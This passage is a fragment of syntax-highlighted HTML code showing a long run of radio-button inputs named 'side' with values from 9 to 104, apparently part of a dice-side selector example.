class="hljs-string">&quot;9&quot;</span> /&gt;</span>9<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10&quot;</span> /&gt;</span>10<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span>11<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;12&quot;</span> /&gt;</span>12<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;13&quot;</span> /&gt;</span>13<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;14&quot;</span> /&gt;</span>14<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;15&quot;</span> /&gt;</span>15<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;16&quot;</span> /&gt;</span>16<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;17&quot;</span> /&gt;</span>17<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;18&quot;</span> /&gt;</span>18<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;19&quot;</span> /&gt;</span>19<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span>20<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;21&quot;</span> /&gt;</span>21<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;22&quot;</span> /&gt;</span>22<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;23&quot;</span> /&gt;</span>23<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;24&quot;</span> /&gt;</span>24<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;25&quot;</span> /&gt;</span>25<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;26&quot;</span> /&gt;</span>26<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;27&quot;</span> /&gt;</span>27<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;28&quot;</span> /&gt;</span>28<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;29&quot;</span> /&gt;</span>29<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span> /&gt;</span>30<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;31&quot;</span> /&gt;</span>31<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;32&quot;</span> /&gt;</span>32<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;33&quot;</span> /&gt;</span>33<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;34&quot;</span> /&gt;</span>34<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;35&quot;</span> /&gt;</span>35<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;36&quot;</span> /&gt;</span>36<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;37&quot;</span> /&gt;</span>37<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;38&quot;</span> /&gt;</span>38<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;39&quot;</span> /&gt;</span>39<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;40&quot;</span> /&gt;</span>40<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;41&quot;</span> /&gt;</span>41<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;42&quot;</span> /&gt;</span>42<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;43&quot;</span> /&gt;</span>43<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;44&quot;</span> /&gt;</span>44<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;45&quot;</span> /&gt;</span>45<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;46&quot;</span> /&gt;</span>46<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;47&quot;</span> /&gt;</span>47<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;48&quot;</span> /&gt;</span>48<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;49&quot;</span> /&gt;</span>49<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;50&quot;</span> /&gt;</span>50<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;51&quot;</span> /&gt;</span>51<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;52&quot;</span> /&gt;</span>52<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;53&quot;</span> /&gt;</span>53<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;54&quot;</span> /&gt;</span>54<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;55&quot;</span> /&gt;</span>55<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;56&quot;</span> /&gt;</span>56<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;57&quot;</span> /&gt;</span>57<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;58&quot;</span> /&gt;</span>58<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;59&quot;</span> /&gt;</span>59<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;60&quot;</span> /&gt;</span>60<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;61&quot;</span> /&gt;</span>61<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;62&quot;</span> /&gt;</span>62<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;63&quot;</span> /&gt;</span>63<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;64&quot;</span> /&gt;</span>64<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;65&quot;</span> /&gt;</span>65<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;66&quot;</span> /&gt;</span>66<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;67&quot;</span> /&gt;</span>67<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;68&quot;</span> /&gt;</span>68<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;69&quot;</span> /&gt;</span>69<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;70&quot;</span> /&gt;</span>70<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;71&quot;</span> /&gt;</span>71<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;72&quot;</span> /&gt;</span>72<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;73&quot;</span> /&gt;</span>73<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;74&quot;</span> /&gt;</span>74<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;75&quot;</span> /&gt;</span>75<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;76&quot;</span> /&gt;</span>76<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;77&quot;</span> /&gt;</span>77<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;78&quot;</span> /&gt;</span>78<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;79&quot;</span> /&gt;</span>79<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;80&quot;</span> /&gt;</span>80<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;81&quot;</span> /&gt;</span>81<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;82&quot;</span> /&gt;</span>82<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;83&quot;</span> /&gt;</span>83<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;84&quot;</span> /&gt;</span>84<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;85&quot;</span> /&gt;</span>85<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;86&quot;</span> /&gt;</span>86<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;87&quot;</span> /&gt;</span>87<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;88&quot;</span> /&gt;</span>88<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;89&quot;</span> /&gt;</span>89<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;90&quot;</span> /&gt;</span>90<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;91&quot;</span> /&gt;</span>91<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;92&quot;</span> /&gt;</span>92<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;93&quot;</span> /&gt;</span>93<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;94&quot;</span> /&gt;</span>94<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;95&quot;</span> /&gt;</span>95<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;96&quot;</span> /&gt;</span>96<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;97&quot;</span> /&gt;</span>97<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;98&quot;</span> /&gt;</span>98<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;99&quot;</span> /&gt;</span>99<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;100&quot;</span> /&gt;</span>100<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;101&quot;</span> /&gt;</span>101<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;102&quot;</span> /&gt;</span>102<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;103&quot;</span> /&gt;</span>103<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;104&quot;</span> /&gt;</span>104<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span 